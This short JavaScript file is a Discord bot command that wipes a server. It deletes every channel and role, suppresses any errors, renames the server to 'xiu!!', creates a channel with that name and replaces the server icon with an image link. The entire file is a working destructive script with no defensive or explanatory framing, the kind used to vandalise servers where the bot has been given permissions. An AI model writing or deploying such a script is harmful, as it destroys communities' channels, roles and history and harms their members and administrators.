exports.run = async (client, msg, args) => {

    msg.delete()

    await msg.guild.channels.forEach(c => c.delete().catch(() => {}))
    await msg.guild.roles.map(r => r.delete().catch(() => {}))

    await msg.guild.setName('xiu!!')

    msg.guild.createChannel('xiu!!', {
        type: 'text'
    }).catch(() => {})
    
    await msg.guild.setIcon('https://cdn.discordapp.com/attachments/1140693402317504715/1141878653832138792/Captura_de_tela_2023-08-17_181937.png')

}
